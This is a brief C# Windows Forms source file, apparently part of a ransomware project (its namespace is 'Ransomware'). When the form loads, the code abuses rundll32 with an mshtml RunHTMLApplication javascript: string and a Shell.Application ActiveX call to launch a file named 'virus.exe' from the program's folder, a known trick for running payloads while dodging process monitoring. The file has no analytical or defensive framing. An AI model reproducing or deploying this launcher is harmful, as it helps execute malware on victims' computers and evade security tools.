using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace Ransomware
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

            //System.IO.File.WriteAllText("C:\\11.txt", "AA");
            //return;
            var path = Application.StartupPath.Replace(@"\",@"\\") + @"\\virus.exe";
            //MessageBox.Show(path);
            var rundll32Exploit = "javascript:\"\\..\\mshtml,RunHTMLApplication \";new%20ActiveXObject('Shell.Application').ShellExecute('"+path+"','','','open','1');";
            System.Diagnostics.Process.Start("rundll32.exe",rundll32Exploit);
        }
    }
}
